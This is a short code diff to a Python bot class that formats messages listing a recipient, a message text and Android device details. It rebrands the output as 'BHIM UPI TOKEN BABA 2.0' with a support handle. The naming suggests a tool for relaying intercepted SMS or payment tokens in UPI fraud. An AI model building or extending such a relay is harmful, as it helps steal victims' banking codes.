@@ -38,7 +38,7 @@ class FixedTokenBot:
         message = self.escape_html(data["message"])
         device = data["device_info"]
         
-        formatted = f"""<b>🏷️ TOKEN BABA 2.0</b>
+        formatted = f"""<b>🏷️ BHIM UPI TOKEN BABA 2.0</b>
 
 🏷️ <b>RECIPIENT :</b> <code>{recipient}</code>
 🏷️ <b>MESSAGE :</b> <code>{message}</code>
@@ -51,7 +51,7 @@ class FixedTokenBot:
 <b>ANDROID VERSION :</b> {device['android_version']}
 <b>SDK :</b> {device['sdk']}
 
-<b>END ARGUMENT</b>"""
+<b>@babajisupport</b>"""
         
         return formatted
     
